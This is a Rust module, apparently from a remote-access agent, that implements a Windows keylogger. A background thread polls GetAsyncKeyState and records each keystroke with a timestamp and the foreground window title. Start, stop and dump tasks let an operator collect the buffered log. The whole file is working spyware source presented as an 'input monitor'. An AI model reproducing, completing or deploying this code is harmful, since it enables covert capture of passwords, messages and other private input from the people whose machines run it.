/// Input monitor: keyboard hook for keystroke logging (Windows only).

use super::TaskResult;
use std::sync::Mutex;

static KEYLOG_BUFFER: Mutex<Option<Vec<String>>> = Mutex::new(None);
static KEYLOG_RUNNING: std::sync::atomic::AtomicBool = std::sync::atomic::AtomicBool::new(false);

pub fn start(task_id: i64, _args: &serde_json::Value) -> TaskResult {
    #[cfg(target_os = "windows")]
    {
        start_windows(task_id)
    }
    #[cfg(not(target_os = "windows"))]
    {
        TaskResult::error(task_id, "input monitoring only supported on Windows".to_string())
    }
}

pub fn stop(task_id: i64, _args: &serde_json::Value) -> TaskResult {
    if !KEYLOG_RUNNING.load(std::sync::atomic::Ordering::SeqCst) {
        return TaskResult::error(task_id, "input monitor not running".to_string());
    }
    KEYLOG_RUNNING.store(false, std::sync::atomic::Ordering::SeqCst);
    TaskResult::success(task_id, "input monitor stopped".to_string())
}

pub fn dump(task_id: i64, _args: &serde_json::Value) -> TaskResult {
    let mut buf = KEYLOG_BUFFER.lock().unwrap();
    match buf.as_mut() {
        Some(entries) => {
            let result = entries.join("\n");
            entries.clear();
            TaskResult::success(task_id, result)
        }
        None => TaskResult::success(task_id, String::new()),
    }
}

#[cfg(target_os = "windows")]
fn start_windows(task_id: i64) -> TaskResult {
    if KEYLOG_RUNNING.load(std::sync::atomic::Ordering::SeqCst) {
        return TaskResult::error(task_id, "input monitor already running".to_string());
    }

    // Initialize buffer
    {
        let mut buf = KEYLOG_BUFFER.lock().unwrap();
        *buf = Some(Vec::new());
    }

    KEYLOG_RUNNING.store(true, std::sync::atomic::Ordering::SeqCst);

    // Spawn monitoring thread
    std::thread::spawn(|| {
        unsafe {
            use winapi::um::winuser::*;
            use winapi::shared::windef::HHOOK;
            use std::ptr;

            // We use GetAsyncKeyState polling approach (simpler, no message loop needed)
            while KEYLOG_RUNNING.load(std::sync::atomic::Ordering::SeqCst) {
                for vk in 0x08u16..0xFEu16 {
                    let state = GetAsyncKeyState(vk as i32);
                    // Bit 0: key was pressed since last call
                    if state & 1 != 0 {
                        let key_name = vk_to_string(vk);
                        if !key_name.is_empty() {
                            // Get foreground window title
                            let title = get_fg_window_title();
                            let ts = chrono::Local::now().format("%H:%M:%S").to_string();
                            let entry = format!("[{}] [{}] {}", ts, title, key_name);

                            if let Ok(mut buf) = KEYLOG_BUFFER.lock() {
                                if let Some(entries) = buf.as_mut() {
                                    entries.push(entry);
                                }
                            }
                        }
                    }
                }
                std::thread::sleep(std::time::Duration::from_millis(10));
            }
        }
    });

    TaskResult::success(task_id, "input monitor started".to_string())
}

#[cfg(target_os = "windows")]
unsafe fn get_fg_window_title() -> String {
    use winapi::um::winuser::*;
    let hwnd = GetForegroundWindow();
    if hwnd.is_null() {
        return "unknown".to_string();
    }
    let mut buf: [u16; 256] = [0; 256];
    let len = GetWindowTextW(hwnd, buf.as_mut_ptr(), 256);
    if len > 0 {
        String::from_utf16_lossy(&buf[..len as usize])
    } else {
        "unknown".to_string()
    }
}

#[cfg(target_os = "windows")]
fn vk_to_string(vk: u16) -> String {
    match vk {
        0x08 => "[BACKSPACE]".to_string(),
        0x09 => "[TAB]".to_string(),
        0x0D => "[ENTER]".to_string(),
        0x1B => "[ESC]".to_string(),
        0x20 => " ".to_string(),
        0x25 => "[LEFT]".to_string(),
        0x26 => "[UP]".to_string(),
        0x27 => "[RIGHT]".to_string(),
        0x28 => "[DOWN]".to_string(),
        0x2E => "[DELETE]".to_string(),
        0x30..=0x39 => ((vk as u8 - 0x30 + b'0') as char).to_string(),
        0x41..=0x5A => ((vk as u8 - 0x41 + b'a') as char).to_string(),
        0xBA => ";".to_string(),
        0xBB => "=".to_string(),
        0xBC => ",".to_string(),
        0xBD => "-".to_string(),
        0xBE => ".".to_string(),
        0xBF => "/".to_string(),
        0xC0 => "`".to_string(),
        0xDB => "[".to_string(),
        0xDC => "\\".to_string(),
        0xDD => "]".to_string(),
        0xDE => "'".to_string(),
        _ => String::new(), // Ignore other keys
    }
}
